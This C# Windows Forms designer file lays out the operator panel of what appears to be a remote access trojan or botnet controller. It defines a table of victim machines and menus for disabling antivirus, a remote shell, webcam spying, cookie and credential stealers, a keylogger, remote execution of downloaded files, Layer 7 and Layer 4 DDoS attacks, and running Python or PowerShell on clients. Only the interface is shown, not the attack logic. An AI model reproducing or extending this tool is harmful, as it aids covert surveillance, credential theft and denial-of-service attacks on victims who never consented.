namespace Server
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.dataGridView1 = new System.Windows.Forms.DataGridView();
            this.Ip = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Country = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.User = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Status = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Operating_System = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.serverToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.testConnectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.updateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.reconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.unistallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.systemInfomartionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startupManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.antiVirusDisableToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.taskManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.registryEditorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.spToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.webcamViewToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cookieStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.credentialStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.miscToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.messageboxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.visitWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.localFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.layer7ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.simpleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hulkpyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.extreme1004000RQToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.layer4ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.scriptsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.python27ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.installPython27ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.runPythonToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.python30ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.installPython30ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.executePython30ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.runPowershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.Welcome = new System.Windows.Forms.TabPage();
            this.About = new System.Windows.Forms.TabPage();
            this.Clients = new System.Windows.Forms.TabPage();
            this.Reverse_Prox = new System.Windows.Forms.TabPage();
            this.panel1 = new System.Windows.Forms.Panel();
            this.label1 = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).BeginInit();
            this.contextMenuStrip1.SuspendLayout();
            this.tabControl1.SuspendLayout();
            this.Clients.SuspendLayout();
            this.SuspendLayout();
            // 
            // richTextBox1
            // 
            this.richTextBox1.Location = new System.Drawing.Point(685, 0);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(10, 10);
            this.richTextBox1.TabIndex = 1;
            this.richTextBox1.Text = "";
            this.richTextBox1.Visible = false;
            // 
            // dataGridView1
            // 
            this.dataGridView1.BackgroundColor = System.Drawing.Color.White;
            this.dataGridView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.dataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.dataGridView1.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Ip,
            this.Country,
            this.User,
            this.Status,
            this.Operating_System});
            this.dataGridView1.ContextMenuStrip = this.contextMenuStrip1;
            this.dataGridView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.dataGridView1.Location = new System.Drawing.Point(3, 3);
            this.dataGridView1.Name = "dataGridView1";
            this.dataGridView1.RowHeadersVisible = false;
            this.dataGridView1.Size = new System.Drawing.Size(673, 392);
            this.dataGridView1.TabIndex = 2;
            // 
            // Ip
            // 
            this.Ip.HeaderText = "Ip";
            this.Ip.Name = "Ip";
            this.Ip.ReadOnly = true;
            this.Ip.Resizable = System.Windows.Forms.DataGridViewTriState.True;
            this.Ip.Width = 150;
            // 
            // Country
            // 
            this.Country.HeaderText = "Country";
            this.Country.Name = "Country";
            this.Country.Width = 150;
            // 
            // User
            // 
            this.User.HeaderText = "User";
            this.User.Name = "User";
            this.User.Width = 120;
            // 
            // Status
            // 
            this.Status.HeaderText = "Status";
            this.Status.Name = "Status";
            // 
            // Operating_System
            // 
            this.Operating_System.HeaderText = "Operating System";
            this.Operating_System.Name = "Operating_System";
            this.Operating_System.Width = 150;
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.serverToolStripMenuItem,
            this.systemToolStripMenuItem,
            this.spToolStripMenuItem,
            this.miscToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            this.contextMenuStrip1.Size = new System.Drawing.Size(181, 114);
            // 
            // serverToolStripMenuItem
            // 
            this.serverToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.testConnectionToolStripMenuItem,
            this.updateToolStripMenuItem,
            this.reconnectToolStripMenuItem,
            this.disconnectToolStripMenuItem,
            this.unistallToolStripMenuItem});
            this.serverToolStripMenuItem.Name = "serverToolStripMenuItem";
            this.serverToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
            this.serverToolStripMenuItem.Text = "Server";
            // 
            // testConnectionToolStripMenuItem
            // 
            this.testConnectionToolStripMenuItem.Name = "testConnectionToolStripMenuItem";
            this.testConnectionToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.testConnectionToolStripMenuItem.Text = "Test Connection";
            this.testConnectionToolStripMenuItem.Click += new System.EventHandler(this.testConnectionToolStripMenuItem_Click);
            // 
            // updateToolStripMenuItem
            // 
            this.updateToolStripMenuItem.Name = "updateToolStripMenuItem";
            this.updateToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.updateToolStripMenuItem.Text = "Update";
            this.updateToolStripMenuItem.Click += new System.EventHandler(this.updateToolStripMenuItem_Click);
            // 
            // reconnectToolStripMenuItem
            // 
            this.reconnectToolStripMenuItem.Name = "reconnectToolStripMenuItem";
            this.reconnectToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.reconnectToolStripMenuItem.Text = "Reconnect";
            this.reconnectToolStripMenuItem.Click += new System.EventHandler(this.reconnectToolStripMenuItem_Click);
            // 
            // disconnectToolStripMenuItem
            // 
            this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.disconnectToolStripMenuItem.Text = "Disconnect";
            this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.disconnectToolStripMenuItem_Click);
            // 
            // unistallToolStripMenuItem
            // 
            this.unistallToolStripMenuItem.Name = "unistallToolStripMenuItem";
            this.unistallToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.unistallToolStripMenuItem.Text = "Unistall";
            this.unistallToolStripMenuItem.Click += new System.EventHandler(this.unistallToolStripMenuItem_Click);
            // 
            // systemToolStripMenuItem
            // 
            this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.systemInfomartionToolStripMenuItem,
            this.startupManagerToolStripMenuItem,
            this.fileManagerToolStripMenuItem,
            this.antiVirusDisableToolStripMenuItem1,
            this.taskManagerToolStripMenuItem,
            this.remoteShellToolStripMenuItem,
            this.registryEditorToolStripMenuItem});
            this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
            this.systemToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
            this.systemToolStripMenuItem.Text = "System";
            // 
            // systemInfomartionToolStripMenuItem
            // 
            this.systemInfomartionToolStripMenuItem.Name = "systemInfomartionToolStripMenuItem";
            this.systemInfomartionToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.systemInfomartionToolStripMenuItem.Text = "System Infomartion";
            this.systemInfomartionToolStripMenuItem.Click += new System.EventHandler(this.systemInfomartionToolStripMenuItem_Click);
            // 
            // startupManagerToolStripMenuItem
            // 
            this.startupManagerToolStripMenuItem.Name = "startupManagerToolStripMenuItem";
            this.startupManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.startupManagerToolStripMenuItem.Text = "Startup Manager";
            this.startupManagerToolStripMenuItem.Click += new System.EventHandler(this.startupManagerToolStripMenuItem_Click);
            // 
            // fileManagerToolStripMenuItem
            // 
            this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
            this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.fileManagerToolStripMenuItem.Text = "File Manager";
            this.fileManagerToolStripMenuItem.Click += new System.EventHandler(this.fileManagerToolStripMenuItem_Click);
            // 
            // antiVirusDisableToolStripMenuItem1
            // 
            this.antiVirusDisableToolStripMenuItem1.Name = "antiVirusDisableToolStripMenuItem1";
            this.antiVirusDisableToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
            this.antiVirusDisableToolStripMenuItem1.Text = "Anti Virus Disable";
            this.antiVirusDisableToolStripMenuItem1.Click += new System.EventHandler(this.antiVirusDisableToolStripMenuItem1_Click);
            // 
            // taskManagerToolStripMenuItem
            // 
            this.taskManagerToolStripMenuItem.Name = "taskManagerToolStripMenuItem";
            this.taskManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.taskManagerToolStripMenuItem.Text = "Task Manager";
            this.taskManagerToolStripMenuItem.Click += new System.EventHandler(this.taskManagerToolStripMenuItem_Click);
            // 
            // remoteShellToolStripMenuItem
            // 
            this.remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
            this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.remoteShellToolStripMenuItem.Text = "Remote Shell";
            this.remoteShellToolStripMenuItem.Click += new System.EventHandler(this.remoteShellToolStripMenuItem_Click);
            // 
            // registryEditorToolStripMenuItem
            // 
            this.registryEditorToolStripMenuItem.Name = "registryEditorToolStripMenuItem";
            this.registryEditorToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
            this.registryEditorToolStripMenuItem.Text = "Registry Editor";
            this.registryEditorToolStripMenuItem.Click += new System.EventHandler(this.registryEditorToolStripMenuItem_Click);
            // 
            // spToolStripMenuItem
            // 
            this.spToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.remoteControlToolStripMenuItem,
            this.webcamViewToolStripMenuItem,
            this.cookieStealerToolStripMenuItem,
            this.credentialStealerToolStripMenuItem});
            this.spToolStripMenuItem.Name = "spToolStripMenuItem";
            this.spToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
            this.spToolStripMenuItem.Text = "Spy";
            // 
            // remoteControlToolStripMenuItem
            // 
            this.remoteControlToolStripMenuItem.Name = "remoteControlToolStripMenuItem";
            this.remoteControlToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.remoteControlToolStripMenuItem.Text = "Remote Control";
            this.remoteControlToolStripMenuItem.Click += new System.EventHandler(this.remoteControlToolStripMenuItem_Click);
            // 
            // webcamViewToolStripMenuItem
            // 
            this.webcamViewToolStripMenuItem.Name = "webcamViewToolStripMenuItem";
            this.webcamViewToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.webcamViewToolStripMenuItem.Text = "Webcam View";
            this.webcamViewToolStripMenuItem.Click += new System.EventHandler(this.webcamViewToolStripMenuItem_Click);
            // 
            // cookieStealerToolStripMenuItem
            // 
            this.cookieStealerToolStripMenuItem.Name = "cookieStealerToolStripMenuItem";
            this.cookieStealerToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.cookieStealerToolStripMenuItem.Text = "Cookie Stealer";
            this.cookieStealerToolStripMenuItem.Click += new System.EventHandler(this.cookieStealerToolStripMenuItem_Click);
            // 
            // credentialStealerToolStripMenuItem
            // 
            this.credentialStealerToolStripMenuItem.Name = "credentialStealerToolStripMenuItem";
            this.credentialStealerToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.credentialStealerToolStripMenuItem.Text = "Credential Stealer";
            this.credentialStealerToolStripMenuItem.Click += new System.EventHandler(this.credentialStealerToolStripMenuItem_Click);
            // 
            // miscToolStripMenuItem
            // 
            this.miscToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.messageboxToolStripMenuItem,
            this.keyloggerToolStripMenuItem,
            this.visitWebsiteToolStripMenuItem,
            this.remoteExecuteToolStripMenuItem,
            this.hitToolStripMenuItem,
            this.scriptsToolStripMenuItem});
            this.miscToolStripMenuItem.Name = "miscToolStripMenuItem";
            this.miscToolStripMenuItem.Size = new System.Drawing.Size(112, 22);
            this.miscToolStripMenuItem.Text = "Misc";
            this.miscToolStripMenuItem.Click += new System.EventHandler(this.miscToolStripMenuItem_Click);
            // 
            // messageboxToolStripMenuItem
            // 
            this.messageboxToolStripMenuItem.Name = "messageboxToolStripMenuItem";
            this.messageboxToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.messageboxToolStripMenuItem.Text = "Messagebox";
            this.messageboxToolStripMenuItem.Click += new System.EventHandler(this.messageboxToolStripMenuItem_Click);
            // 
            // keyloggerToolStripMenuItem
            // 
            this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
            this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.keyloggerToolStripMenuItem.Text = "Keylogger";
            this.keyloggerToolStripMenuItem.Click += new System.EventHandler(this.keyloggerToolStripMenuItem_Click);
            // 
            // visitWebsiteToolStripMenuItem
            // 
            this.visitWebsiteToolStripMenuItem.Name = "visitWebsiteToolStripMenuItem";
            this.visitWebsiteToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.visitWebsiteToolStripMenuItem.Text = "Visit Website";
            this.visitWebsiteToolStripMenuItem.Click += new System.EventHandler(this.visitWebsiteToolStripMenuItem_Click);
            // 
            // remoteExecuteToolStripMenuItem
            // 
            this.remoteExecuteToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.localFileToolStripMenuItem,
            this.fiToolStripMenuItem});
            this.remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
            this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.remoteExecuteToolStripMenuItem.Text = "Remote Execute";
            // 
            // localFileToolStripMenuItem
            // 
            this.localFileToolStripMenuItem.Name = "localFileToolStripMenuItem";
            this.localFileToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
            this.localFileToolStripMenuItem.Text = "Local File";
            this.localFileToolStripMenuItem.Click += new System.EventHandler(this.localFileToolStripMenuItem_Click);
            // 
            // fiToolStripMenuItem
            // 
            this.fiToolStripMenuItem.Name = "fiToolStripMenuItem";
            this.fiToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
            this.fiToolStripMenuItem.Text = "Web File";
            this.fiToolStripMenuItem.Click += new System.EventHandler(this.fiToolStripMenuItem_Click);
            // 
            // hitToolStripMenuItem
            // 
            this.hitToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.layer7ToolStripMenuItem,
            this.layer4ToolStripMenuItem});
            this.hitToolStripMenuItem.Name = "hitToolStripMenuItem";
            this.hitToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.hitToolStripMenuItem.Text = "DDOS";
            this.hitToolStripMenuItem.Click += new System.EventHandler(this.hitToolStripMenuItem_Click);
            // 
            // layer7ToolStripMenuItem
            // 
            this.layer7ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.simpleToolStripMenuItem,
            this.hulkpyToolStripMenuItem,
            this.extreme1004000RQToolStripMenuItem});
            this.layer7ToolStripMenuItem.Name = "layer7ToolStripMenuItem";
            this.layer7ToolStripMenuItem.Size = new System.Drawing.Size(111, 22);
            this.layer7ToolStripMenuItem.Text = "Layer 7";
            // 
            // simpleToolStripMenuItem
            // 
            this.simpleToolStripMenuItem.Name = "simpleToolStripMenuItem";
            this.simpleToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
            this.simpleToolStripMenuItem.Text = "Simple 15-25RQ";
            this.simpleToolStripMenuItem.Click += new System.EventHandler(this.simpleToolStripMenuItem_Click);
            // 
            // hulkpyToolStripMenuItem
            // 
            this.hulkpyToolStripMenuItem.Name = "hulkpyToolStripMenuItem";
            this.hulkpyToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
            this.hulkpyToolStripMenuItem.Text = "Normal 50-200RQ";
            this.hulkpyToolStripMenuItem.Click += new System.EventHandler(this.hulkpyToolStripMenuItem_Click);
            // 
            // extreme1004000RQToolStripMenuItem
            // 
            this.extreme1004000RQToolStripMenuItem.Name = "extreme1004000RQToolStripMenuItem";
            this.extreme1004000RQToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
            this.extreme1004000RQToolStripMenuItem.Text = "Extreme 100-4000RQ";
            this.extreme1004000RQToolStripMenuItem.Click += new System.EventHandler(this.extreme1004000RQToolStripMenuItem_Click);
            // 
            // layer4ToolStripMenuItem
            // 
            this.layer4ToolStripMenuItem.Name = "layer4ToolStripMenuItem";
            this.layer4ToolStripMenuItem.Size = new System.Drawing.Size(111, 22);
            this.layer4ToolStripMenuItem.Text = "Layer 4";
            // 
            // scriptsToolStripMenuItem
            // 
            this.scriptsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.python27ToolStripMenuItem,
            this.python30ToolStripMenuItem,
            this.runPowershellToolStripMenuItem});
            this.scriptsToolStripMenuItem.Name = "scriptsToolStripMenuItem";
            this.scriptsToolStripMenuItem.Size = new System.Drawing.Size(159, 22);
            this.scriptsToolStripMenuItem.Text = "Scripts";
            // 
            // python27ToolStripMenuItem
            // 
            this.python27ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.installPython27ToolStripMenuItem1,
            this.runPythonToolStripMenuItem});
            this.python27ToolStripMenuItem.Name = "python27ToolStripMenuItem";
            this.python27ToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
            this.python27ToolStripMenuItem.Text = "Python 2.7";
            this.python27ToolStripMenuItem.Click += new System.EventHandler(this.python27ToolStripMenuItem_Click);
            // 
            // installPython27ToolStripMenuItem1
            // 
            this.installPython27ToolStripMenuItem1.Name = "installPython27ToolStripMenuItem1";
            this.installPython27ToolStripMenuItem1.Size = new System.Drawing.Size(164, 22);
            this.installPython27ToolStripMenuItem1.Text = "Install Python 2.7";
            this.installPython27ToolStripMenuItem1.Click += new System.EventHandler(this.installPython27ToolStripMenuItem1_Click);
            // 
            // runPythonToolStripMenuItem
            // 
            this.runPythonToolStripMenuItem.Name = "runPythonToolStripMenuItem";
            this.runPythonToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.runPythonToolStripMenuItem.Text = "Run Python 2.7";
            this.runPythonToolStripMenuItem.Click += new System.EventHandler(this.runPythonToolStripMenuItem_Click);
            // 
            // python30ToolStripMenuItem
            // 
            this.python30ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.installPython30ToolStripMenuItem,
            this.executePython30ToolStripMenuItem});
            this.python30ToolStripMenuItem.Name = "python30ToolStripMenuItem";
            this.python30ToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
            this.python30ToolStripMenuItem.Text = "Python 3.0";
            // 
            // installPython30ToolStripMenuItem
            // 
            this.installPython30ToolStripMenuItem.Name = "installPython30ToolStripMenuItem";
            this.installPython30ToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.installPython30ToolStripMenuItem.Text = "Install Python 3.0";
            // 
            // executePython30ToolStripMenuItem
            // 
            this.executePython30ToolStripMenuItem.Name = "executePython30ToolStripMenuItem";
            this.executePython30ToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.executePython30ToolStripMenuItem.Text = "Run Python 3.0";
            // 
            // runPowershellToolStripMenuItem
            // 
            this.runPowershellToolStripMenuItem.Name = "runPowershellToolStripMenuItem";
            this.runPowershellToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
            this.runPowershellToolStripMenuItem.Text = "Run Powershell";
            this.runPowershellToolStripMenuItem.Click += new System.EventHandler(this.runPowershellToolStripMenuItem_Click);
            // 
            // timer1
            // 
            this.timer1.Interval = 600;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.Welcome);
            this.tabControl1.Controls.Add(this.About);
            this.tabControl1.Controls.Add(this.Clients);
            this.tabControl1.Controls.Add(this.Reverse_Prox);
            this.tabControl1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.25F);
            this.tabControl1.Location = new System.Drawing.Point(-2, 19);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(687, 426);
            this.tabControl1.TabIndex = 6;
            // 
            // Welcome
            // 
            this.Welcome.Location = new System.Drawing.Point(4, 24);
            this.Welcome.Name = "Welcome";
            this.Welcome.Padding = new System.Windows.Forms.Padding(3);
            this.Welcome.Size = new System.Drawing.Size(679, 398);
            this.Welcome.TabIndex = 1;
            this.Welcome.Text = "Welcome";
            this.Welcome.UseVisualStyleBackColor = true;
            // 
            // About
            // 
            this.About.Location = new System.Drawing.Point(4, 24);
            this.About.Name = "About";
            this.About.Size = new System.Drawing.Size(679, 398);
            this.About.TabIndex = 2;
            this.About.Text = "About";
            this.About.UseVisualStyleBackColor = true;
            // 
            // Clients
            // 
            this.Clients.Controls.Add(this.dataGridView1);
            this.Clients.Location = new System.Drawing.Point(4, 24);
            this.Clients.Name = "Clients";
            this.Clients.Padding = new System.Windows.Forms.Padding(3);
            this.Clients.Size = new System.Drawing.Size(679, 398);
            this.Clients.TabIndex = 0;
            this.Clients.Text = "Clients";
            this.Clients.UseVisualStyleBackColor = true;
            // 
            // Reverse_Prox
            // 
            this.Reverse_Prox.Location = new System.Drawing.Point(4, 24);
            this.Reverse_Prox.Name = "Reverse_Prox";
            this.Reverse_Prox.Size = new System.Drawing.Size(679, 398);
            this.Reverse_Prox.TabIndex = 3;
            this.Reverse_Prox.Text = "Reverse Proxy";
            this.Reverse_Prox.UseVisualStyleBackColor = true;
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.panel1.Location = new System.Drawing.Point(0, 0);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(685, 20);
            this.panel1.TabIndex = 7;
            this.panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.panel1_MouseDown);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(0, 447);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(94, 13);
            this.label1.TabIndex = 8;
            this.label1.Text = "V1.4 - Up To Date";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(683, 465);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.tabControl1);
            this.Controls.Add(this.richTextBox1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Form1";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).EndInit();
            this.contextMenuStrip1.ResumeLayout(false);
            this.tabControl1.ResumeLayout(false);
            this.Clients.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private System.Windows.Forms.RichTextBox richTextBox1;
        private System.Windows.Forms.DataGridView dataGridView1;
        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;
        private System.Windows.Forms.ToolStripMenuItem serverToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem systemToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem miscToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem messageboxToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem visitWebsiteToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteExecuteToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem localFileToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fiToolStripMenuItem;
        private System.Windows.Forms.DataGridViewTextBoxColumn Ip;
        private System.Windows.Forms.DataGridViewTextBoxColumn Country;
        private System.Windows.Forms.DataGridViewTextBoxColumn User;
        private System.Windows.Forms.DataGridViewTextBoxColumn Status;
        private System.Windows.Forms.DataGridViewTextBoxColumn Operating_System;
        private System.Windows.Forms.ToolStripMenuItem spToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteControlToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem testConnectionToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem unistallToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem updateToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem reconnectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disconnectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fileManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem systemInfomartionToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startupManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem antiVirusDisableToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem taskManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteShellToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem registryEditorToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem webcamViewToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cookieStealerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem credentialStealerToolStripMenuItem;
        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.ToolStripMenuItem hitToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem scriptsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem python27ToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem installPython27ToolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem runPythonToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem python30ToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem installPython30ToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem executePython30ToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem runPowershellToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem layer7ToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem simpleToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem hulkpyToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem layer4ToolStripMenuItem;
